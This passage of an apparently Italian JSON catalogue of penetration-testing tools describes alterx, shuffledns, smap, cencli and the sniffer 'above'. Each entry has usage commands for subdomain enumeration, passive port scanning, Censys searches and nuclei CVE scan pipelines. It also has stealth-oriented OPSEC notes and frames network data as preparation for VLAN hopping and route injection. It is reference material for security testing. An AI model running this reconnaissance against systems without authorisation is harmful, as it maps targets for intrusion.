richieste. Per operazioni sensibili, considerare resolver privati.</li><li><strong>Rate Limiting:</strong> Senza <code>-l</code> appropriato, alcuni resolver potrebbero bloccare le query. Distribuire il carico su molti resolver.</li><li><strong>Massdns Dependency:</strong> Richiede massdns installato. Verificare che sia presente e nel PATH prima dell'uso.</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "projectdiscovery-alterx",
    "name": "alterx",
    "version": "latest",
    "icon": "../app/icons/github.svg",
    "installation": "Go",
    "repo": "https://github.com/projectdiscovery/alterx",
    "desc": "Generatore di wordlist per subdomain basato su pattern DSL per permutazioni intelligenti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>AlterX</strong> di ProjectDiscovery è un generatore di wordlist per subdomain di nuova generazione che utilizza un Domain Specific Language (DSL) per creare permutazioni intelligenti. A differenza di tool legacy come altdns che applicano pattern statici predefiniti, AlterX analizza i subdomain in input per scoprire automaticamente le naming convention specifiche del target, generando permutazioni che hanno alta probabilità di esistere perché seguono la stessa logica già usata dall'organizzazione.</p><p>Il DSL permette di definire template sofisticati con variabili come {{word}}, {{sub}}, {{suffix}}, {{number}} e operatori per combinazioni, increment e mutation. La modalità \"enrich\" analizza automaticamente i subdomain forniti, estrae pattern comuni (prefissi numerati, suffissi ambiente, separatori usati) e arricchisce il vocabolario con parole estratte dai nomi esistenti. Il risultato è una wordlist mirata che può scoprire in poche migliaia di entry ciò che richiederebbe milioni di tentativi con wordlist generiche.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Intelligent Pattern DSL:</strong> Linguaggio espressivo per definire template di permutazione. Supporta variabili ({{sub}}, {{word}}, {{number}}, {{suffix}}), operatori di mutazione (case change, separator swap), e combinatori per generare varianti multiple.</p><p><strong>Auto Pattern Mining:</strong> La modalità <code>-enrich</code> analizza i subdomain input per scoprire pattern: identifica prefissi/suffissi comuni (dev-, -api, -staging), sequenze numeriche (server1, server2), separatori usati (dash, underscore, dot).</p><p><strong>Word Extraction:</strong> Estrae automaticamente \"words\" significative dai subdomain esistenti e le usa come base per permutazioni. Se esiste \"billing-api.target.com\", estrae \"billing\" e \"api\" per generare combinazioni.</p><p><strong>Payload Templates:</strong> Template predefiniti per scenari comuni (environment permutations, numeric sequences, service discovery) che possono essere combinati con pattern custom.</p><p><strong>Limit Controls:</strong> Controllo preciso sulla dimensione output con <code>-limit</code> per evitare wordlist esplosive quando i pattern combinati producono milioni di entry.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === GENERAZIONE BASE ===\n# Genera permutazioni default da singolo subdomain\necho \"api.target.com\" | alterx\n# Output: api-dev.target.com, api-staging.target.com, api1.target.com, etc.\n\n# Da lista di subdomain noti\ncat known_subdomains.txt | alterx -o permutations.txt\n\n# === PATTERN CUSTOM ===\n# Pattern specifico: word-environment.domain\necho \"api.target.com\" | alterx -p '{{word}}-dev.{{root}}'\necho \"api.target.com\" | alterx -p '{{word}}-staging.{{root}}'\necho \"api.target.com\" | alterx -p '{{word}}-uat.{{root}}'\n\n# Sequenze numeriche\necho \"server.target.com\" | alterx -p '{{word}}{{number}}.{{root}}'\n# Output: server1.target.com, server2.target.com, ...\n\n# Combinazione prefisso + suffisso\necho \"api.target.com\" | alterx -p 'internal-{{sub}}.{{root}}' -p '{{sub}}-internal.{{root}}'\n\n# === ENRICHMENT MODE ===\n# Auto-discovery pattern (modalità più potente)\ncat subdomains.txt | alterx -enrich -o enriched_wordlist.txt\n\n# Enrich con limite output\ncat subdomains.txt | alterx -enrich -limit 50000 -o wordlist.txt\n\n# === PATTERN AVANZATI ===\n# Multi-level subdomain\necho \"api.prod.target.com\" | alterx -p '{{word}}.dev.{{root}}'\n\n# Variazioni separatori\necho \"api-server.target.com\" | alterx -p '{{word}}_server.{{root}}' -p '{{word}}.server.{{root}}'\n\n# Combinazioni multiple\necho \"app.target.com\" | alterx -p '{{word}}-{{number}}.{{root}}' \\\n  -en num-count=10  # genera app-1 fino a app-10\n\n# === PIPELINE COMPLETA ===\n# Workflow: passive -&gt; enrich -&gt; resolve -&gt; probe\nsubfinder -d target.com -silent | tee passive.txt | \\\n  alterx -enrich -limit 100000 | \\\n  puredns resolve -r resolvers.txt | \\\n  httpx -silent | nuclei -t cves/\n\n# Generate + resolve immediate\ncat known.txt | alterx -enrich | dnsx -silent -o new_found.txt\n\n# === PATTERN SPECIFICI PER SCENARI ===\n# DevOps environments\ncat subdomains.txt | alterx -p '{{word}}-dev.{{root}}' \\\n  -p '{{word}}-stage.{{root}}' -p '{{word}}-prod.{{root}}' \\\n  -p '{{word}}-test.{{root}}' -p '{{word}}-qa.{{root}}'\n\n# Cloud regions\ncat subdomains.txt | alterx -p '{{word}}-us-east-1.{{root}}' \\\n  -p '{{word}}-eu-west-1.{{root}}' -p '{{word}}-ap-southeast-1.{{root}}'\n\n# Versioning\ncat subdomains.txt | alterx -p '{{word}}-v1.{{root}}' \\\n  -p '{{word}}-v2.{{root}}' -p '{{word}}-beta.{{root}}'\n\n# === OUTPUT ANALYSIS ===\n# Conta permutazioni generate\ncat known.txt | alterx -enrich | wc -l\n\n# Preview senza salvare\necho \"api.target.com\" | alterx -p '{{word}}-{{number}}.{{root}}' | head -20</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Targeted Brute-Force:</strong> Genera wordlist specifiche per il target invece di usare liste generiche da milioni di entry. Maggiore probabilità di successo con meno query.</li><li><strong>Pattern Exploitation:</strong> Quando scopri che un target usa naming convention specifiche (es. service-env-region), AlterX genera tutte le combinazioni possibili di quel pattern.</li><li><strong>Environment Discovery:</strong> Trova ambienti dev/staging/test che usano gli stessi nomi dei servizi production ma con prefissi/suffissi diversi.</li><li><strong>Numeric Sequence Enumeration:</strong> Scopre server numerati (db1, db2, db3...) che spesso esistono in infrastrutture di una certa scala.</li><li><strong>Wordlist Optimization:</strong> Riduce wordlist massive a subset mirati basati sui pattern realmente usati dal target.</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Zero Network Activity:</strong> AlterX è completamente offline - genera solo wordlist senza effettuare query di rete.</li><li><strong>Output Size Control:</strong> Senza <code>-limit</code>, combinazioni di pattern possono generare milioni di entry. Sempre verificare la dimensione output prima di usarla in resolution.</li><li><strong>Quality over Quantity:</strong> Wordlist mirate sono più efficaci di liste enormi. Preferire pattern specifici a combinazioni esplosive.</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "projectdiscovery-shuffledns",
    "name": "shuffledns",
    "version": "latest",
    "icon": "../app/icons/github.svg",
    "installation": "Go",
    "repo": "https://github.com/projectdiscovery/shuffledns",
    "desc": "Wrapper massdns per subdomain brute-force e resolution con wildcard filtering automatico.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>ShuffleDNS</strong> di ProjectDiscovery è un wrapper intelligente attorno a massdns che semplifica drasticamente le operazioni di subdomain enumeration su larga scala. Mentre massdns raw è potente ma produce output rumoroso pieno di falsi positivi da DNS wildcard, ShuffleDNS integra wildcard filtering automatico e gestione intelligente dei resolver, producendo risultati puliti pronti per le fasi successive del workflow.</p><p>Il tool opera in due modalità: brute-force con wordlist per generare e testare nuovi subdomain, e resolve mode per validare liste pre-esistenti da altri tool come subfinder o amass. In entrambi i casi, il wildcard filtering analizza le risposte DNS per identificare e rimuovere i falsi positivi causati da domini che rispondono a qualsiasi query. L'architettura mantiene la velocità brutale di massdns (decine di migliaia di query al secondo) aggiungendo l'intelligence necessaria per risultati utilizzabili.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Dual Operation Mode:</strong> <code>-w</code> per brute-force con wordlist (genera subdomain e li risolve), <code>-list</code> per validare liste di subdomain pre-generate. Stesso motore, casi d'uso diversi.</p><p><strong>Wildcard Filtering Automatico:</strong> Rileva automaticamente DNS wildcard testando subdomain casuali e confrontando le risposte. Elimina tutti i risultati che matchano il pattern wildcard.</p><p><strong>Massdns Backend:</strong> Sfrutta massdns per parallelismo estremo. Default 10.000 query concorrenti, configurabile fino al limite della rete/hardware.</p><p><strong>Resolver Management:</strong> Accetta liste di resolver custom e distribuisce le query per evitare rate limiting e ottenere risultati da prospettive geografiche diverse.</p><p><strong>Resume Support:</strong> Può riprendere scansioni interrotte, utile per operazioni di ore su wordlist massive.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === PREREQUISITI ===\n# Richiede massdns installato\n# Su Kali: apt install massdns\n# Richiede lista resolver (es. da github.com/trickest/resolvers)\n\n# === BRUTE-FORCE MODE ===\n# Brute-force base\nshuffledns -d target.com -w wordlist.txt -r resolvers.txt\n\n# Con output file\nshuffledns -d target.com -w wordlist.txt -r resolvers.txt -o found.txt\n\n# Wordlist massiva con concurrency aumentata\nshuffledns -d target.com -w subdomains-top1million-110000.txt \\\n  -r resolvers.txt -t 50000 -o results.txt\n\n# === RESOLVE MODE ===\n# Valida lista esistente (es. da subfinder)\nshuffledns -d target.com -list subdomains.txt -r resolvers.txt -o valid.txt\n\n# Pipeline con subfinder\nsubfinder -d target.com -silent | shuffledns -d target.com -r resolvers.txt\n\n# === WILDCARD HANDLING ===\n# Verifica se wildcard presente (test manuale)\necho \"randomnonexistent98765.target.com\" | shuffledns -d target.com -r resolvers.txt\n\n# Strict mode per wildcard detection\nshuffledns -d target.com -w wordlist.txt -r resolvers.txt -sw\n\n# === PIPELINE RECON ===\n# Workflow completo: brute + passive + merge\nshuffledns -d target.com -w wordlist.txt -r resolvers.txt -o brute.txt &amp;\nsubfinder -d target.com -silent -o passive.txt &amp;\nwait\ncat brute.txt passive.txt | sort -u | shuffledns -d target.com -r resolvers.txt -o final.txt\n\n# Vers nuclei per vuln scan\ncat final.txt | httpx -silent | nuclei -t cves/ -severity high,critical\n\n# === MULTI-DOMAIN ===\n# Batch processing multipli domini\ncat domains.txt | while read domain; do\n  shuffledns -d \"$domain\" -w wordlist.txt -r resolvers.txt -o \"${domain}_subs.txt\" -silent\ndone\n\n# === OUTPUT OPTIONS ===\n# JSON per parsing programmatico\nshuffledns -d target.com -w wordlist.txt -r resolvers.txt -json -o results.json\n\n# Silent mode per pipeline\nshuffledns -d target.com -w wordlist.txt -r resolvers.txt -silent | httpx -silent\n\n# === PERFORMANCE TUNING ===\n# Alta velocità (richiede buona connessione e molti resolver)\nshuffledns -d target.com -w massive_wordlist.txt -r 5000_resolvers.txt \\\n  -t 100000 -o results.txt\n\n# Retry per resolver instabili\nshuffledns -d target.com -w wordlist.txt -r resolvers.txt -retries 3\n\n# === INTEGRAZIONE MASSDNS ===\n# Specifica path massdns custom\nshuffledns -d target.com -w wordlist.txt -r resolvers.txt \\\n  -m /custom/path/massdns</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Mass Subdomain Enumeration:</strong> Brute-force su larga scala per organizzazioni enterprise con potenzialmente migliaia di subdomain. La velocità di massdns permette di testare milioni di combinazioni in ore.</li><li><strong>Result Validation:</strong> Dopo enumeration passiva con subfinder/amass/chaos, valida quali subdomain sono effettivamente live prima di procedere con scanning HTTP.</li><li><strong>Continuous Monitoring:</strong> Integrato in pipeline di monitoring, esegue scansioni periodiche per identificare nuovi subdomain deployati.</li><li><strong>ProjectDiscovery Workflow:</strong> Si integra nativamente con altri tool PD: subfinder per passive, shuffledns per active, httpx per probe, nuclei per scan.</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Extreme DNS Volume:</strong> Genera un volume massiccio di query DNS. I nameserver autoritativi del target ricevono ogni query e potrebbero loggare o bloccare.</li><li><strong>Resolver Logging:</strong> I resolver pubblici utilizzati vedono tutte le query. Per operazioni sensibili, considerare resolver privati o DoH.</li><li><strong>Rate Limiting Risk:</strong> Concurrency troppo alta può triggerare blocchi sui resolver. Usare molti resolver diversi e <code>-t</code> ragionevole.</li><li><strong>Massdns Dependency:</strong> Richiede massdns installato e nel PATH. Verificare prima dell'uso con <code>which massdns</code>.</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "smap",
    "name": "smap",
    "version": "latest",
    "icon": "../app/icons/github.svg",
    "installation": "Go",
    "repo": "https://github.com/s0md3v/smap",
    "desc": "Port scanner passivo che usa Shodan API per scansionare senza contattare i target direttamente.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Smap</strong> di s0md3v è un port scanner rivoluzionario che inverte il paradigma tradizionale: invece di inviare pacchetti ai target per scoprire porte aperte, interroga l'API gratuita di Shodan per ottenere le stesse informazioni senza generare alcun traffico di rete verso i target. Progettato come drop-in replacement per Nmap, accetta la stessa sintassi di input e produce output compatibili (XML, greppable, standard), permettendo di sostituirlo in script e workflow esistenti.</p><p>Questa capacità è trasformativa per scenari dove la stealth è critica: penetration test con regole di engagement restrittive, reconnaissance su target che monitorano attivamente le scansioni, o pre-assessment per decidere se procedere con scanning attivo. La velocità è un altro vantaggio enorme: mentre nmap richiede minuti per scansionare un singolo host, smap può processare 200+ host al secondo perché le query sono verso Shodan, non verso i target. La limitazione principale è la freshness dei dati: Shodan indicizza periodicamente, quindi i risultati potrebbero essere vecchi di giorni.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Zero-Touch Scanning:</strong> Nessun pacchetto viene mai inviato ai target. Tutte le informazioni provengono dal database Shodan, rendendo la scansione completamente invisibile a IDS/IPS e firewall.</p><p><strong>Nmap Compatibility:</strong> Accetta la stessa sintassi di target (IP, CIDR, file) e produce output negli stessi formati (-oX per XML, -oG per greppable, -oN per normale). Integrabile in workflow esistenti.</p><p><strong>Vulnerability Detection:</strong> Quando Shodan ha identificato vulnerabilità note nei servizi (basandosi su banner e versioni), smap le riporta nell'output.</p><p><strong>No Authentication:</strong> Funziona con l'API pubblica di Shodan senza richiedere account o API key, anche se con rate limiting.</p><p><strong>Service Information:</strong> Oltre alle porte, riporta banner dei servizi, versioni software, certificati SSL e altre informazioni raccolte da Shodan.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === SCANSIONI BASE ===\n# Scan singolo IP\nsmap 8.8.8.8\n\n# Scan hostname\nsmap target.com\n\n# Scan range CIDR\nsmap 10.0.0.0/24\n\n# === OUTPUT FORMATS ===\n# Output XML (compatibile con tool che parsano nmap XML)\nsmap 192.168.1.0/24 -oX results.xml\n\n# Output greppable (per scripting)\nsmap targets.txt -oG results.gnmap\n\n# Output normale in file\nsmap target.com -oN results.txt\n\n# === INPUT MULTIPLO ===\n# Da file di IP/hostname\nsmap -iL targets.txt\n\n# Mix di target\nsmap 192.168.1.1 target.com 10.0.0.0/24\n\n# === PIPELINE RECON ===\n# Workflow stealth: subfinder -&gt; smap -&gt; identify services\nsubfinder -d target.com -silent | dnsx -a -resp-only | smap -oX scan.xml\n\n# Quick assessment prima di nmap attivo\nsmap target.com  # vedi cosa è già noto\nnmap -sV target.com -p $(smap target.com | grep open | cut -d/ -f1 | tr '\\n' ',')  # scan attivo solo su porte note\n\n# Verifica esposizione infrastruttura\ncat company_ips.txt | smap -oG exposure.gnmap\ngrep \"open\" exposure.gnmap | wc -l  # conta servizi esposti\n\n# === ANALISI RISULTATI ===\n# Estrai servizi specifici\nsmap 10.0.0.0/24 -oG - | grep \"22/open\" | cut -d\" \" -f2  # host con SSH\n\n# Cerca servizi vulnerabili\nsmap target.com | grep -i \"vuln\"\n\n# === CONFRONTO CON NMAP ===\n# Smap per overview passiva\nsmap target.com -oX passive.xml\n\n# Nmap per conferma attiva\nnmap -sV target.com -oX active.xml\n\n# Diff per vedere cosa manca a Shodan\ndiff &lt;(grep -o 'portid=\"[0-9]*\"' passive.xml | sort) \\\n     &lt;(grep -o 'portid=\"[0-9]*\"' active.xml | sort)\n\n# === BULK SCANNING ===\n# Enterprise-scale assessment (centinaia di host in secondi)\nprips 10.0.0.0/16 | smap -oG massive_scan.gnmap\n\n# Con output silenzioso per post-processing\nsmap -iL 1000_hosts.txt -oX results.xml 2&gt;/dev/null</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Stealth Reconnaissance:</strong> Quando le regole di engagement proibiscono scanning attivo nella fase iniziale, o quando si vuole evitare di triggerare alert prima di essere pronti.</li><li><strong>Pre-Assessment Evaluation:</strong> Prima di un penetration test, verifica cosa è già pubblicamente noto sull'infrastruttura del cliente tramite Shodan.</li><li><strong>Attack Surface Discovery:</strong> Identifica rapidamente servizi esposti su range IP enormi senza generare traffico sospetto.</li><li><strong>Compliance Verification:</strong> Controlla periodicamente l'esposizione di servizi critici senza impattare la produzione.</li><li><strong>Comparison Baseline:</strong> Confronta risultati smap (passivi) con nmap (attivi) per identificare servizi che Shodan non ha ancora indicizzato.</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Zero Target Visibility:</strong> Completamente invisibile ai target - nessun pacchetto, nessun log, nessun alert. Ideale per stealth.</li><li><strong>Shodan Visibility:</strong> Le query sono verso Shodan. Per operazioni molto sensibili, considerare che Shodan potrebbe loggare le query (anche se non le correla ai target).</li><li><strong>Data Freshness:</strong> I dati Shodan possono essere vecchi di giorni o settimane. Non affidabili per servizi appena deployati o modificati.</li><li><strong>Coverage Limitata:</strong> Shodan indicizza ~4000 porte, non tutte le 65535. Servizi su porte non standard potrebbero mancare.</li><li><strong>No IPv6:</strong> Supporto IPv6 limitato o assente. Usare nmap per target IPv6.</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "censys-cencli",
    "name": "cencli",
    "version": "latest",
    "icon": "../app/icons/github.svg",
    "installation": "pipx",
    "repo": "https://github.com/censys/cencli",
    "desc": "CLI ufficiale Censys per query su host, certificati e web properties con vulnerability scanning.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Cencli</strong> (Censys CLI) è lo strumento ufficiale da linea di comando per accedere alla piattaforma Censys, uno dei più completi database di intelligence su asset Internet al mondo. Censys esegue scansioni continue dell'intero spazio IPv4 e IPv6, indicizzando host, servizi, certificati SSL/TLS e web properties. La CLI porta questa potenza direttamente nel terminale, permettendo query complesse, lookup di asset specifici, e analisi aggregate senza dover usare l'interfaccia web.</p><p>A differenza di tool come Shodan che si concentrano principalmente su porte e banner, Censys eccelle nell'analisi dei certificati SSL/TLS, fondamentale per scoprire infrastruttura nascosta (un certificato wildcard può rivelare subdomain non altrimenti visibili), tracciare relazioni tra asset (certificati condivisi indicano proprietà comune), e identificare vulnerabilità crittografiche. Il comando Censeye integra vulnerability scanning automatizzato sui dati Censys, mentre le aggregazioni permettono trend analysis su larga scala.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Host Intelligence:</strong> Lookup dettagliato di qualsiasi IP: porte aperte, servizi, banner, certificati SSL, autonomous system, geolocalizzazione, historical data per vedere come è cambiato nel tempo.</p><p><strong>Certificate Search:</strong> Query potenti sul database certificati: trova tutti i cert per un dominio, cerca per issuer, validity, SANs (Subject Alternative Names), algoritmi. Fondamentale per asset discovery.</p><p><strong>Aggregations:</strong> Query aggregate per analisi statistiche: distribuzione di servizi per country, trend temporali, top autonomous systems per un certo tipo di vulnerabilità.</p><p><strong>Censeye Integration:</strong> Vulnerability assessment automatizzato che correla i dati Censys con database CVE per identificare servizi vulnerabili.</p><p><strong>Historical Data:</strong> Accesso a snapshots storici per analizzare come l'infrastruttura di un target è evoluta nel tempo.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === SETUP INIZIALE ===\n# Configurazione credenziali (richiede account Censys gratuito)\ncensys config auth add\n# Inserire API ID e API Secret da censys.io/account/api\n\n# Verifica configurazione\ncensys config show\n\n# === HOST LOOKUP ===\n# Dettagli completi su un IP\ncensys hosts view 8.8.8.8\n\n# Output JSON per parsing\ncensys hosts view 8.8.8.8 -o json | jq '.services[].port'\n\n# Solo servizi aperti\ncensys hosts view 8.8.8.8 | grep -A5 \"Services:\"\n\n# === CERTIFICATE SEARCH ===\n# Trova tutti i certificati per un dominio\ncensys certs search \"parsed.subject.common_name: target.com\"\n\n# Certificati con SAN specifico (trova subdomain)\ncensys certs search \"parsed.extensions.subject_alt_name.dns_names: target.com\"\n\n# Certificati wildcard (rivelano infrastruttura)\ncensys certs search \"parsed.subject.common_name: *.target.com\"\n\n# Certificati scaduti (potenziale vulnerabilità)\ncensys certs search \"parsed.validity.end: [* TO 2024-01-01]\"\n\n# === HOST SEARCH ===\n# Trova host per servizio\ncensys hosts search \"services.service_name: SSH and autonomous_system.name: Target Inc\"\n\n# Host con vulnerabilità specifiche\ncensys hosts search \"services.software.cpe: *apache* and services.software.version: 2.4.49\"\n\n# Host per certificato\ncensys hosts search \"services.tls.certificates.leaf_data.subject.common_name: target.com\"\n\n# === AGGREGATIONS ===\n# Distribuzione servizi per un'organizzazione\ncensys hosts aggregate \"autonomous_system.name: Target Inc\" --field services.service_name\n\n# Top paesi per un certo servizio\ncensys hosts aggregate \"services.service_name: RDP\" --field location.country\n\n# === PIPELINE RECON ===\n# Workflow: trova cert -&gt; estrai subdomain -&gt; probe\ncensys certs search \"parsed.extensions.subject_alt_name.dns_names: target.com\" -o json | \\\n  jq -r '.[] | .parsed.extensions.subject_alt_name.dns_names[]' | \\\n  sort -u | httpx -silent | nuclei -t cves/\n\n# Trova tutti gli IP di un'organizzazione\ncensys hosts search \"autonomous_system.name: Target Inc\" -o json | \\\n  jq -r '.[].ip' | sort -u &gt; target_ips.txt\n\n# === CENSEYE VULNERABILITY SCAN ===\n# Scan vulnerabilità su target\ncensys censeye 192.168.1.1\n\n# Scan batch\ncensys censeye -iL targets.txt\n\n# === HISTORICAL ANALYSIS ===\n# Vedi come è cambiato un host\ncensys hosts diff 8.8.8.8 --start 2024-01-01 --end 2024-06-01\n\n# === OUTPUT &amp; EXPORT ===\n# CSV per spreadsheet\ncensys hosts search \"services.service_name: MySQL\" -o csv &gt; mysql_hosts.csv\n\n# JSON per processing\ncensys certs search \"parsed.issuer.organization: Let's Encrypt\" -o json &gt; letsencrypt_certs.json</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Attack Surface Discovery:</strong> Usando certificate SANs e host search per autonomous system, scopre l'intera infrastruttura internet-facing di un'organizzazione, inclusi asset dimenticati.</li><li><strong>Certificate Intelligence:</strong> Monitora certificati per un dominio: nuovi cert potrebbero indicare nuova infrastruttura, cert scaduti sono vulnerabilità, cert condivisi rivelano relazioni.</li><li><strong>Threat Hunting:</strong> Cerca indicatori di compromissione su scala internet: C2 servers, malware infrastructure, phishing domains basandosi su pattern in certificati o banner.</li><li><strong>Vulnerability Assessment Passivo:</strong> Identifica servizi con versioni vulnerabili note senza scansionare direttamente, utile per pre-assessment.</li><li><strong>Historical Analysis:</strong> Analizza come l'infrastruttura di un target è evoluta, identificando pattern di deployment o momenti di esposizione.</li><li><strong>Competitive Intelligence:</strong> Studia l'infrastruttura tecnologica di competitor analizzando i loro certificati e servizi esposti.</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Zero Target Interaction:</strong> Tutte le query sono verso l'API Censys, nessun traffico verso i target analizzati. Completamente passivo.</li><li><strong>API Authentication:</strong> Richiede account Censys e API key. Le query sono loggate da Censys con il tuo account.</li><li><strong>Rate Limits:</strong> Account gratuiti hanno limiti sulle query. Account enterprise rimuovono i limiti.</li><li><strong>Data Freshness:</strong> I dati Censys sono aggiornati periodicamente (giorni/settimane). Non real-time.</li><li><strong>Legal Considerations:</strong> L'uso dei dati Censys è soggetto ai loro Terms of Service. Verificare compliance per il proprio use case.</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence",
      "Domain_Recon"
    ],
    "notes": null
  },
  {
    "id": "above",
    "name": "above",
    "version": "2.8",
    "icon": "../app/icons/above-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/above/",
    "desc": "Sniffer passivo di rete per intercettare protocolli L2/L3 (CDP, LLDP, ARP, DHCP) e rilevare dispositivi e VLAN.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Above</strong> è uno sniffer di rete passivo specializzato nell'intercettazione di protocolli di livello 2 e 3 utilizzati per il network discovery e la gestione infrastrutturale. Cattura e analizza traffico CDP (Cisco Discovery Protocol), LLDP (Link Layer Discovery Protocol), ARP, DHCP, STP, VTP, DTP, HSRP, VRRP, OSPF, EIGRP e altri protocolli di management, rivelando informazioni critiche sulla topologia di rete, dispositivi connessi, configurazioni VLAN e dettagli hardware che non emergono da scansioni attive tradizionali.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Passive Discovery:</strong> Ascolta silenziosamente il traffico broadcast/multicast senza inviare alcun pacchetto, rendendosi completamente invisibile a IDS/IPS e sistemi di monitoraggio. Ideale per reconnaissance in ambienti ad alta sicurezza dove ogni pacchetto anomalo viene analizzato.</p><p><strong>Protocol Analysis:</strong> Decodifica automaticamente CDP e LLDP per estrarre hostname, modelli di dispositivo, versioni firmware, indirizzi IP di management, capabilities (router/switch/phone) e informazioni sulle VLAN native e voice VLAN configurate.</p><p><strong>VLAN Discovery:</strong> Identifica le VLAN in uso sulla rete analizzando i tag 802.1Q e le informazioni DTP (Dynamic Trunking Protocol), permettendo di mappare la segmentazione logica della rete e identificare potenziali target per VLAN hopping.</p><p><strong>Routing Protocol Capture:</strong> Intercetta annunci OSPF, EIGRP, HSRP e VRRP per mappare la topologia di routing, identificare router virtuali e potenziali punti di attacco per routing hijacking.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Above richiede privilegi root per catturare pacchetti raw e un'interfaccia in modalità promiscua.</p><pre><code># === CATTURA BASE ===\n# Avvio su interfaccia specifica\nsudo above -i eth0\n\n# Cattura con output dettagliato e timestamp\nsudo above -i eth0 -v --timestamp\n\n# === FILTRI PROTOCOLLO ===\n# Solo CDP e LLDP (discovery dispositivi)\nsudo above -i eth0 --cdp --lldp\n\n# Solo protocolli di routing (OSPF, EIGRP, HSRP)\nsudo above -i eth0 --ospf --eigrp --hsrp\n\n# Solo DHCP (discovery server e scope)\nsudo above -i eth0 --dhcp\n\n# === OUTPUT E ANALISI ===\n# Salvataggio JSON per parsing automatico\nsudo above -i eth0 -o discovery.json --format json\n\n# Output CSV per import in spreadsheet\nsudo above -i eth0 -o devices.csv --format csv\n\n# Cattura prolungata in background (24h monitoring)\nsudo above -i eth0 -o long_capture.json --timeout 86400 &amp;\n\n# === PIPELINE CON ALTRI TOOL ===\n# Estrai IP di management e scansiona\nsudo above -i eth0 --lldp -o - | jq -r '.management_ip' | sort -u | nmap -iL -\n\n# Identifica VLAN per VLAN hopping\nsudo above -i eth0 --dtp -v  # cerca native VLAN e trunk status</code></pre><p>Lasciare in esecuzione per 5-10 minuti permette di catturare gli annunci periodici CDP/LLDP (ogni 30-60s), HSRP (ogni 3s) e OSPF hello (ogni 10s).</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nella fase di <strong>Network Reconnaissance</strong> interna, Above rivela l'infrastruttura di rete senza generare traffico sospetto: modelli di switch Cisco, versioni IOS, VLAN configurate e indirizzi di management.</p><p>Per il <strong>VLAN Hopping</strong>, le informazioni raccolte (native VLAN, DTP status) sono prerequisiti essenziali per configurare attacchi double-tagging o switch spoofing.</p><p>In contesti di <strong>Physical Pentest</strong>, collegandosi a una porta di rete qualsiasi si ottiene immediatamente visibilità sulla topologia circostante.</p><p>Per <strong>Routing Attack Preparation</strong>, la cattura di OSPF/EIGRP/HSRP rivela area ID, authentication status e priorità dei router, informazioni necessarie per attacchi di route injection.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Essendo completamente passivo, Above è virtualmente non rilevabile. Non genera traffico e non modifica lo stato dell'interfaccia in modo osservabile remotamente.</p><p><strong>Limitazioni:</strong> Funziona solo su segmenti di rete dove il traffico broadcast/multicast è visibile. Switch configurati senza CDP/LLDP o con port isolation non riveleranno informazioni.</p><p><strong>Timing:</strong> Alcuni protocolli hanno timer lunghi (CDP 60s, LLDP 30s). Prevedere almeno 2-3 minuti di cattura per risultati completi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "aesfix",
    "name": "aesfix",
    "version": "1.0.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/aesfix/",
    "desc": "Recupera chiavi AES corrotte da dump RAM correggendo bit flip tramite analisi key schedule e ridondanza algoritmica.",
